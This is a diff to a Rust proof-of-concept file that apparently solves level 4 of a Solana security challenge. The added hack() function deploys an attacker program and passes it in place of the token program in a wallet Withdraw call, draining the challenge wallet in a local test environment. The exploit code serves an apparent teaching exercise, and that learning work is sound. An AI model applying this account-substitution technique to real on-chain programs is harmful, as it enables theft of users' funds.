@@ -1,5 +1,6 @@
 use std::{env, str::FromStr};
 
+use borsh::BorshSerialize;
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
 use poc_framework::spl_associated_token_account::get_associated_token_address;
@@ -8,6 +9,7 @@ use poc_framework::{
 };
 
 use pocs::assert_tx_success;
+use solana_program::instruction::{AccountMeta, Instruction};
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
 struct Challenge {
@@ -19,7 +21,53 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    let mut dir = env::current_exe().unwrap();
+    let evil_program_path = {
+        dir.pop();
+        dir.pop();
+        dir.push("deploy");
+        dir.push("level4_poc_contract.so");
+        dir.to_str()
+    }
+    .unwrap();
+
+    let evil_program = env.deploy_program(evil_program_path);
+
+    assert_tx_success(env.execute_as_transaction(
+        &[level4::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+            challenge.mint,
+        )],
+        &[&challenge.hacker],
+    ));
+
+    let (hacker_wallet, _) =
+        level4::get_wallet_address(&challenge.hacker.pubkey(), &challenge.wallet_program);
+
+    let (authority_address, _) = level4::get_authority(&challenge.wallet_program);
+
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[Instruction {
+                program_id: challenge.wallet_program,
+                accounts: vec![
+                    AccountMeta::new(hacker_wallet, false),
+                    AccountMeta::new_readonly(authority_address, false),
+                    AccountMeta::new_readonly(challenge.hacker.pubkey(), true),
+                    AccountMeta::new(challenge.wallet_address, false),
+                    AccountMeta::new_readonly(spl_token::id(), false),
+                    AccountMeta::new_readonly(evil_program, false),
+                ],
+                data: level4::WalletInstruction::Withdraw { amount: 100 }
+                    .try_to_vec()
+                    .unwrap(),
+            }],
+            &[&challenge.hacker],
+        ),
+    );
+}
 
 /*
 SETUP CODE BELOW
